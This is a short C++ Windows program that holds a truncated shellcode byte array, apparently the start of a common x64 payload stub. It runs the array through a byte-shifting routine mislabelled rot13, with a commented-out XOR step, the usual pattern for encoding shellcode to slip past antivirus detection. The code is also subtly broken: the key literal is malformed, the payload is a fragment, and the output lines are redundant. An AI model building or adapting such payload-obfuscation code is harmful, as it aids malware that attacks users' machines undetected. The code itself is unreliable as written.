#include <windows.h>
#include <iostream>

using namespace std;

void rot13(unsigned char* bytes, int byteCount)
{
    for (int i = 0 ; i < byteCount ; i++)
    {
        *bytes = (*bytes - 13) % 256;
        bytes++;
    }
    return;
}

int main()
{
    unsigned char shellcode[] = "\x41\x41\x42\x42\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41";
    unsigned char* cptr;
    cptr = shellcode;
    unsigned char key[] = "\xFF\0xFF\xfF";
    int byteCount = *(&shellcode + 1) - shellcode;
	//_xor(cptr, key, byteCount);

    rot13(cptr, byteCount);
    std::cout << (int)shellcode[0] << std::endl;
    cptr = shellcode;
	
    std::cout << (int)shellcode[0] << std::endl;
    
    return 0;
}